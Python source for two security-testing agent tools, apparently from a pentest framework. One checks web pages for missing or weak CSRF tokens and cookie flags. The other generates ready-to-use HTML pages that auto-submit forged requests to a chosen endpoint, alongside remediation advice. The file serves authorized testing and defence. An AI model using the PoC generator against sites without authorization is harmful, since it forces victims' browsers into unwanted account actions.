"""
CSRF Detection & Exploitation Tools

Implements two agent tools for Cross-Site Request Forgery testing:

  CSRFDetectTool   — detect missing/weak CSRF tokens, analyse SameSite cookie
                     attributes, and detect token reuse across requests.
  CSRFExploitTool  — generate ready-to-use PoC HTML forms for confirmed CSRF
                     endpoints.

OWASP Mapping: A01:2021-Broken Access Control (session riding falls under
access control violations) and A05:2021-Security Misconfiguration (missing
SameSite/token controls).
"""

from __future__ import annotations

import logging
import re
from enum import Enum
from html import escape as html_escape
from typing import Any, Dict, List, Optional

from app.agent.tools.base_tool import BaseTool, ToolMetadata
from app.agent.tools.error_handling import truncate_output
from app.mcp.base_server import MCPClient

logger = logging.getLogger(__name__)

DEFAULT_CURL_SERVER_URL = "http://kali-tools:8001"

OWASP_CSRF_TAG = "A01:2021-Broken Access Control / A05:2021-Security Misconfiguration"

# ---------------------------------------------------------------------------
# CSRF token detection heuristics
# ---------------------------------------------------------------------------

# Common CSRF token header/field names
_CSRF_HEADER_NAMES: List[str] = [
    "x-csrf-token", "x-xsrf-token", "x-csrftoken", "csrf-token",
    "x-requested-with", "x-request-id", "anti-forgery-token",
    "_token", "authenticity_token",
]

# Common CSRF hidden field names
_CSRF_FIELD_NAMES: List[str] = [
    "_csrf", "csrf_token", "csrfmiddlewaretoken", "_token",
    "authenticity_token", "__requestverificationtoken", "_RequestVerificationToken",
    "csrf", "xsrf_token", "anti_csrf_token",
]

_CSRF_FIELD_RE = re.compile(
    r'<input[^>]*(?:name|id)\s*=\s*["\']?('
    + "|".join(re.escape(f) for f in _CSRF_FIELD_NAMES)
    + r")[\"']?[^>]*>",
    re.IGNORECASE,
)

_CSRF_VALUE_RE = re.compile(
    # Captures the value attribute regardless of whether name or value comes first
    r'<input[^>]*\bvalue\s*=\s*["\']([^"\']{6,})["\'][^>]*>',
    re.IGNORECASE,
)

# SameSite cookie detection
_SAMESITE_RE = re.compile(r"samesite\s*=\s*(\w+)", re.IGNORECASE)
_SECURE_RE = re.compile(r"\bSecure\b", re.IGNORECASE)
_HTTPONLY_RE = re.compile(r"\bHttpOnly\b", re.IGNORECASE)


class CSRFRisk(str, Enum):
    """Risk level of a CSRF finding."""
    HIGH = "high"           # No CSRF protection at all
    MEDIUM = "medium"       # Weak protection (short token, reused, no SameSite)
    LOW = "low"             # Minor misconfiguration (SameSite=Lax but no token)
    NONE = "none"           # Properly protected


def _parse_set_cookie_headers(response_headers: Dict[str, str]) -> List[str]:
    """Extract all Set-Cookie header values from a response headers dict."""
    cookies: List[str] = []
    for key, value in response_headers.items():
        if key.lower() == "set-cookie":
            cookies.append(value)
        # Some frameworks join multiple headers with "; " or "\n"
        elif key.lower().startswith("set-cookie"):
            cookies.extend(value.split("\n"))
    return [c for c in cookies if c.strip()]


def analyse_csrf_token(response_body: str, response_headers: Dict[str, str]) -> Dict[str, Any]:
    """Analyse a response for CSRF token presence and quality.

    Returns a dict with keys:
      found (bool), token_value (str|None), token_field (str|None),
      samesite (str|None), secure (bool), httponly (bool), risk (CSRFRisk)
    """
    found = bool(_CSRF_FIELD_RE.search(response_body))
    token_value: Optional[str] = None
    token_field: Optional[str] = None

    m_val = _CSRF_VALUE_RE.search(response_body)
    if m_val:
        token_value = m_val.group(1)

    m_field = _CSRF_FIELD_RE.search(response_body)
    if m_field:
        token_field = m_field.group(1)

    # Check response headers for CSRF token
    for hdr, val in response_headers.items():
        if hdr.lower() in _CSRF_HEADER_NAMES:
            found = True
            token_value = val

    # Analyse Set-Cookie headers
    cookies = _parse_set_cookie_headers(response_headers)
    samesite: Optional[str] = None
    secure = False
    httponly = False

    for cookie in cookies:
        m_ss = _SAMESITE_RE.search(cookie)
        if m_ss:
            samesite = m_ss.group(1).lower()
        if _SECURE_RE.search(cookie):
            secure = True
        if _HTTPONLY_RE.search(cookie):
            httponly = True

    # Determine risk
    if not found:
        if samesite in ("strict", "lax"):
            risk = CSRFRisk.LOW  # SameSite alone is partial mitigation
        else:
            risk = CSRFRisk.HIGH
    else:
        # Token found — check quality
        if token_value and len(token_value) < 8:
            risk = CSRFRisk.MEDIUM  # Token too short
        elif samesite is None and not secure:
            risk = CSRFRisk.MEDIUM  # Token present but cookies not hardened
        else:
            risk = CSRFRisk.NONE

    return {
        "found": found,
        "token_value": token_value,
        "token_field": token_field,
        "samesite": samesite,
        "secure": secure,
        "httponly": httponly,
        "risk": risk.value,
    }


# ---------------------------------------------------------------------------
# PoC HTML form generator
# ---------------------------------------------------------------------------

_POC_TEMPLATE = """\
<!DOCTYPE html>
<html>
<head>
  <title>CSRF PoC — {endpoint}</title>
</head>
<body onload="document.getElementById('csrf_form').submit()">
  <h1>CSRF Proof-of-Concept</h1>
  <p>Target: <code>{endpoint}</code></p>
  <p>Method: <code>{method}</code></p>
  <form id="csrf_form" action="{endpoint}" method="{method_lower}" enctype="{enctype}">
{fields}
    <input type="submit" value="Submit (auto-submitted on load)">
  </form>
  <p><em>Generated by UniVex CSRFExploitTool — {owasp_tag}</em></p>
</body>
</html>"""

_FIELD_TEMPLATE = '    <input type="hidden" name="{name}" value="{value}">'


def generate_csrf_poc(
    endpoint: str,
    method: str = "POST",
    fields: Optional[Dict[str, str]] = None,
    content_type: str = "application/x-www-form-urlencoded",
) -> str:
    """Generate an HTML PoC page that auto-submits a CSRF request.

    Args:
        endpoint:     Target URL.
        method:       HTTP method (POST / PUT / DELETE / PATCH).
        fields:       Form field name→value mapping.
        content_type: Form encoding type.

    Returns:
        HTML string ready to save as a .html file.
    """
    enctype = "application/x-www-form-urlencoded"
    if content_type.lower() == "multipart/form-data":
        enctype = "multipart/form-data"

    rendered_fields = "\n".join(
        _FIELD_TEMPLATE.format(
            name=html_escape(k, quote=True),
            value=html_escape(str(v), quote=True),
        )
        for k, v in (fields or {}).items()
    )

    return _POC_TEMPLATE.format(
        endpoint=html_escape(endpoint),
        method=method.upper(),
        method_lower=method.lower(),
        enctype=enctype,
        fields=rendered_fields,
        owasp_tag=OWASP_CSRF_TAG,
    )


# ---------------------------------------------------------------------------
# CSRFDetectTool
# ---------------------------------------------------------------------------


class CSRFDetectTool(BaseTool):
    """Detect missing or weak CSRF protections on a target endpoint.

    Checks:
    1. Presence of CSRF token in GET response (form token / XSRF header)
    2. SameSite attribute on session cookies (Strict / Lax / None)
    3. Token reuse: requests a fresh token twice and compares — if identical,
       tokens are static and reusable (MEDIUM risk).
    4. Cross-origin state-changing request acceptance without valid token.
    """

    def __init__(
        self,
        server_url: str = DEFAULT_CURL_SERVER_URL,
        project_id: Optional[str] = None,
        user_id: Optional[str] = None,
    ):
        self._server_url = server_url
        self._project_id = project_id
        self._user_id = user_id
        self._client = MCPClient(server_url)
        super().__init__()

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="csrf_detect",
            description=(
                "Detect CSRF vulnerabilities: missing tokens, weak SameSite attributes, "
                "token reuse, and missing Secure/HttpOnly cookie flags. "
                "Reports risk level (HIGH/MEDIUM/LOW) with OWASP A01/A05 tagging."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "url": {
                        "type": "string",
                        "description": "URL of the page/form to analyse for CSRF protections.",
                    },
                    "action_url": {
                        "type": "string",
                        "description": "The state-changing endpoint to test (if different from url). "
                        "E.g. the form action URL.",
                        "default": "",
                    },
                    "method": {
                        "type": "string",
                        "description": "HTTP method of the state-changing request (POST/PUT/DELETE/PATCH).",
                        "enum": ["POST", "PUT", "DELETE", "PATCH"],
                        "default": "POST",
                    },
                    "cookies": {
                        "type": "string",
                        "description": "Session cookies to send (name=value; name2=value2).",
                        "default": "",
                    },
                    "check_token_reuse": {
                        "type": "boolean",
                        "description": "Fetch the page twice and compare CSRF tokens (detects static tokens).",
                        "default": True,
                    },
                },
                "required": ["url"],
            },
        )

    async def execute(  # type: ignore[override]
        self,
        url: str,
        action_url: str = "",
        method: str = "POST",
        cookies: str = "",
        check_token_reuse: bool = True,
        **kwargs: Any,
    ) -> str:
        headers: Dict[str, str] = {}
        if cookies:
            headers["Cookie"] = cookies

        # First request: fetch the form page
        result1 = await self._fetch(url, headers)
        if not result1.get("success"):
            return f"[csrf_detect] Failed to fetch {url}: {result1.get('error', 'unknown error')}"

        body1 = self._get_body(result1)
        resp_headers1 = result1.get("headers", {})
        analysis1 = analyse_csrf_token(body1, resp_headers1)

        token_reuse_issue = False
        if check_token_reuse and analysis1["found"] and analysis1["token_value"]:
            result2 = await self._fetch(url, headers)
            body2 = self._get_body(result2)
            analysis2 = analyse_csrf_token(body2, result2.get("headers", {}))
            if analysis2.get("token_value") == analysis1["token_value"]:
                token_reuse_issue = True

        return self._format(url, action_url or url, method, analysis1, token_reuse_issue)

    async def _fetch(self, url: str, headers: Dict[str, str]) -> Dict[str, Any]:
        try:
            return await self._client.call_tool(
                "execute_curl",
                {"url": url, "method": "GET", "headers": headers, "follow_redirects": True},
            )
        except Exception as exc:
            logger.debug("CSRF detect fetch failed: %s", exc)
            return {"success": False, "error": str(exc)}

    def _get_body(self, result: Dict[str, Any]) -> str:
        body = result.get("body", "")
        if isinstance(body, dict):
            import json
            return json.dumps(body)
        return str(body) if body else ""

    def _format(
        self,
        url: str,
        action_url: str,
        method: str,
        analysis: Dict[str, Any],
        token_reuse: bool,
    ) -> str:
        risk = analysis["risk"]
        token = analysis.get("token_value") or "N/A"
        token_display = token[:32] + ("..." if len(token) > 32 else "")
        lines = [
            f"[csrf_detect] CSRF Analysis: {url}",
            f"  Action endpoint:  {action_url} [{method}]",
            "",
            "── Token Analysis ────────────────────────",
            f"  CSRF token found: {'YES' if analysis['found'] else 'NO ⚠'}",
            f"  Token field:      {analysis.get('token_field') or 'N/A'}",
            f"  Token value:      {token_display}",
            f"  Token reuse:      {'YES — static token detected ⚠' if token_reuse else 'Not detected'}",
            "",
            "── Cookie Analysis ───────────────────────",
            f"  SameSite:         {analysis.get('samesite') or 'NOT SET ⚠'}",
            f"  Secure flag:      {'Yes' if analysis.get('secure') else 'No ⚠'}",
            f"  HttpOnly flag:    {'Yes' if analysis.get('httponly') else 'No ⚠'}",
            "",
            f"  Risk Level:       {risk.upper()}",
            f"  OWASP:            {OWASP_CSRF_TAG}",
            "",
        ]

        if risk == CSRFRisk.HIGH.value:
            lines += [
                "  ⚠ HIGH RISK: No CSRF token and no SameSite=Strict/Lax. ",
                "  Endpoint is likely vulnerable to cross-site request forgery.",
                "  → Use csrf_exploit to generate a PoC HTML form.",
            ]
        elif risk == CSRFRisk.MEDIUM.value:
            lines.append("  ⚠ MEDIUM RISK: Partial CSRF protection — verify manually.")
        elif risk == CSRFRisk.LOW.value:
            lines.append("  ℹ LOW RISK: SameSite provides partial protection but no token present.")
        else:
            lines.append("  ✓ No CSRF vulnerability detected (token + cookie flags are adequate).")

        return truncate_output("\n".join(lines))


# ---------------------------------------------------------------------------
# CSRFExploitTool
# ---------------------------------------------------------------------------


class CSRFExploitTool(BaseTool):
    """Generate a CSRF PoC HTML file for a confirmed vulnerable endpoint.

    The generated page auto-submits a form on load, demonstrating the attack
    to a client during a pentest engagement. It includes a comment with the
    OWASP reference and remediation advice.
    """

    def __init__(self, project_id: Optional[str] = None, user_id: Optional[str] = None):
        self._project_id = project_id
        self._user_id = user_id
        super().__init__()

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="csrf_exploit",
            description=(
                "Generate a ready-to-use CSRF PoC HTML page for a confirmed vulnerable endpoint. "
                "The page auto-submits on load. Returns the HTML source — save it as .html and "
                "open in a browser to demonstrate the attack."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "endpoint": {
                        "type": "string",
                        "description": "The vulnerable state-changing endpoint URL.",
                    },
                    "method": {
                        "type": "string",
                        "description": "HTTP method (POST / PUT / DELETE / PATCH).",
                        "enum": ["POST", "PUT", "DELETE", "PATCH"],
                        "default": "POST",
                    },
                    "fields": {
                        "type": "object",
                        "description": "Form fields to include in the PoC (name → value).",
                        "default": {},
                    },
                    "content_type": {
                        "type": "string",
                        "description": "Form encoding (application/x-www-form-urlencoded or multipart/form-data).",
                        "enum": ["application/x-www-form-urlencoded", "multipart/form-data"],
                        "default": "application/x-www-form-urlencoded",
                    },
                },
                "required": ["endpoint"],
            },
        )

    async def execute(  # type: ignore[override]
        self,
        endpoint: str,
        method: str = "POST",
        fields: Optional[Dict[str, str]] = None,
        content_type: str = "application/x-www-form-urlencoded",
        **kwargs: Any,
    ) -> str:
        poc_html = generate_csrf_poc(
            endpoint=endpoint,
            method=method,
            fields=fields or {},
            content_type=content_type,
        )
        lines = [
            f"[csrf_exploit] CSRF PoC generated for {endpoint}",
            f"  Method:       {method.upper()}",
            f"  Fields:       {list((fields or {}).keys())}",
            f"  OWASP:        {OWASP_CSRF_TAG}",
            "",
            "── PoC HTML ──────────────────────────────",
            poc_html,
            "",
            "── Remediation ───────────────────────────",
            "  1. Implement synchroniser token pattern (random, per-session, per-request)",
            "  2. Set SameSite=Strict on all session cookies",
            "  3. Validate Origin/Referer headers server-side",
            "  4. Use Double Submit Cookie pattern as a secondary defence",
        ]
        return truncate_output("\n".join(lines))


__all__ = [
    "CSRFDetectTool",
    "CSRFExploitTool",
    "generate_csrf_poc",
    "analyse_csrf_token",
    "CSRFRisk",
    "OWASP_CSRF_TAG",
    "_CSRF_FIELD_NAMES",
    "_CSRF_HEADER_NAMES",
]
